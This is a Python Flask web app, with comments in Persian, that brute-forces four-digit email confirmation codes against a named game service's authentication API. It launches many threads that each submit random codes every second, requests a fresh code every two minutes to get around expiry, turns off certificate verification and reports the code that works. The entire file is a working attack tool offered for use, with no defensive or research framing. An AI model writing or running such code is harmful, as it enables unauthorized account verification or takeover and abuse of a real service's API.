from flask import Flask, render_template, request, jsonify
from threading import Thread, Event, Lock
from datetime import datetime, timedelta
import random
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

status_messages = []
threads = []
stop_event = Event()
minute_thread_started = False
code_expired_flag = False
minute_thread_lock = Lock()

def add_status(msg, color="black"):
    status_messages.append({
        "timestamp": datetime.now().strftime("%H:%M:%S"),
        "message": msg,
        "color": color
    })
    if len(status_messages) > 100:
        del status_messages[0]

def func_every_2_minute(username):
    global stop_event
    if stop_event.is_set():
        return False
    try:
        url = "https://api.radar.game/v1/auth/resendConfirmCode"
        payload = {"username": username}
        headers = {
            'User-Agent': "Ktor client",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'authorization': "Bearer",
            'accept-charset': "UTF-8"
        }
        response = requests.post(url, json=payload, headers=headers, verify=False)
        if "This username is not found" in response.text:
            add_status(f"This [{username}] username is not found!", "red")
            stop_event.set()
            return False
        if "email should be valid" in response.text:
            add_status("You have not entered your email correctly!", "red")
            stop_event.set()
            return False
        add_status("A new code is sent every 2 minutes.", "gray")
        return True
    except Exception as e:
        add_status(f"Error: {e}", "red")
        stop_event.set()
        return False

def func_every_second(username, code):
    global stop_event
    global code_expired_flag
    if stop_event.is_set():
        return False
    try:
        url = "https://api.radar.game/v1/auth/confirmed"
        payload = {"username": username, "code": code}
        headers = {
            'User-Agent': "Ktor client",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'authorization': "Bearer",
            'accept-charset': "UTF-8"
        }
        response = requests.post(url, json=payload, headers=headers, verify=False)
        if stop_event.is_set():
            return False
        if response.status_code == 200:
            add_status(f"Code confirmed successfully ;), Success code is : {code}", "green")
            stop_event.set()
            return False
        elif "User is already confirmed" in response.text:
            add_status("User is already confirmed.", "orange")
            stop_event.set()
            return False
        elif "This code is expired" in response.text:
            if not code_expired_flag:
                add_status("Code expired, new code sent.", "gray")
                code_expired_flag = True
            # دیگر اینجا func_every_2_minute را صدا نمی‌زنیم چون یک Thread مخصوص این کار داریم
        else:
            # اگر خطای دیگری بود یا موفقیت، فلگ را ریست کن
            code_expired_flag = False
            # اگر خطای جدی بود، همه را متوقف کن (در صورت نیاز اینجا هم stop_event.set() بگذار)
        add_status(f"Testing code is: {code}", "white")
        return True
    except Exception as e:
        add_status(f"Error: {e}", "red")
        stop_event.set()
        return False

def generate_random_code():
    return random.randint(1000, 9999)

def minute_worker(username):
    while not stop_event.is_set():
        func_every_2_minute(username)
        for _ in range(120):  # هر 2 دقیقه یک بار
            if stop_event.is_set():
                break
            time.sleep(1)

def send_codes(username):
    global minute_thread_started
    # فقط یک بار Thread مربوط به func_every_2_minute اجرا شود
    with minute_thread_lock:
        if not minute_thread_started:
            t = Thread(target=minute_worker, args=(username,))
            t.daemon = True
            t.start()
            minute_thread_started = True

    while not stop_event.is_set():
        code = generate_random_code()
        cont = func_every_second(username, code)
        if not cont:
            break
        time.sleep(1)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global threads, minute_thread_started
    stop_event.clear()
    minute_thread_started = False
    email = request.form.get('email')
    threads_count = int(request.form.get('threads', 20))
    status_messages.clear()
    add_status("Started sending codes...", "green")
    threads = []
    for _ in range(threads_count):
        t = Thread(target=send_codes, args=(email,))
        t.daemon = True
        t.start()
        threads.append(t)
    return jsonify({"status": "started"})

@app.route('/stop', methods=['GET'])
def stop():
    stop_event.set()
    add_status("Stopped by user.", "red")
    return jsonify({"status": "stopped"})

@app.route('/status')
def status():
    return jsonify({"messages": status_messages})

if __name__ == '__main__':
    app.run(debug=True)